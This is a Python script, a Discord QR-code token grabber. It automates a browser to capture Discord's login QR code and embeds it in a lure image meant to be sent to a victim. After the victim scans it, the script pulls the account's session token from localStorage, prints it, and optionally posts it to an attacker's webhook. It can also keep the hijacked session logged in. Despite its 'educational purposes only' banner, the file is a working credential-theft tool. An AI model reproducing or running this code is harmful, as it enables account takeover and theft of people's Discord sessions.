import time, requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import urllib.request

from PIL import Image

login_url = "https://discord.com/login"
print("")
print("[1] - Create Token-Grabbing QR-Code!")
print("[2] - Login with a external Token! (NO-QR-CODE)")
choice = input("Which Number do you want to start? ")

if(choice == "1"):
    print("\n\nIf you choose 'Grab' you can add a Webhook-URL so it will get sent to it!")
    grab_token_input = input("Do you want to grab the Token or log in directly? Grab/Login -> ")
    if(grab_token_input.lower() == "grab"):
        grab_token = True
    elif(grab_token_input.lower() == "login"):
        grab_token = False
    else:
        print("You have to choose one Option!")
        exit()

    if(grab_token):
        print("\nIf you dont want to use Webhook enter 'no' -> ")
        webhook_url = input("If you want to use a Webhook enter the Link, otherwise input 'no' ->")

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    driver.get(login_url)
    time.sleep(5)

    print("\nUse for educational purposes only!")
    print("  _____                _         _                              _ ")
    print(" |  __ \              | |       | |                            | |")
    print(" | |__) |___  __ _  __| |_   _  | |_ ___    ___  ___ __ _ _ __ | |")
    print(" |  _  // _ \/ _` |/ _` | | | | | __/ _ \  / __|/ __/ _` | '_ \| |")
    print(" | | \ \  __/ (_| | (_| | |_| | | || (_) | \__ \ (_| (_| | | | |_|")
    print(" |_|  \_\___|\__,_|\__,_|\__, |  \__\___/  |___/\___\__,_|_| |_(_)")
    print("                          __/ |                                   ")
    print("                         |___/                                    ")
    print("Use for educational purposes only!\n")

    qrcode = driver.find_element(by=By.XPATH, value="/html/body/div[1]/div[2]/div/div[1]/div/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[1]/img")
    link = qrcode.get_attribute("src")
    urllib.request.urlretrieve(link, "./img_do_not_change/qrcode.png")

    bg = Image.open('./img_do_not_change/background.png')
    qrcode = Image.open('./img_do_not_change/qrcode.png')
    discord = Image.open('./img_do_not_change/discord.png')

    qrcode = qrcode.resize(size=(127, 127))
    discord = discord.resize(size=(40, 40))

    bg.paste(qrcode, (87, 313))
    bg.paste(discord, (130, 355), discord)

    bg.save('./sendthis.png')

    wait = WebDriverWait(driver, 120)
    wait.until_not(EC.url_matches(login_url))

    if(grab_token):

        token = driver.execute_script('''
    window.dispatchEvent(new Event('beforeunload'));
    let iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    let localStorage = iframe.contentWindow.localStorage;
    var token = JSON.parse(localStorage.token);
    return token;
    ''')

        print("Someone scanned the Code | Token -> " + token)

        if(webhook_url.lower() != "no"):
            data = {'content': 'Token: ' + token, 'name': 'QR-Code TokenGrabber'}
            result = requests.post(webhook_url, json = data)
            try:
                result.raise_for_status()
            except requests.exceptions.HTTPError as err:
                print("Someone scanned the Code | Webhook Error!")
                print(err)
            else:
                print("Someone scanned the Code | Webhook got sent successfully!")
    else:
        print("Someone scanned the Code | You got logged in to the account!")
        while True:
            pass
elif(choice == "2"):
    print("currently working on it!")
else:
    print("Please use one of the Options! Input only the Number!")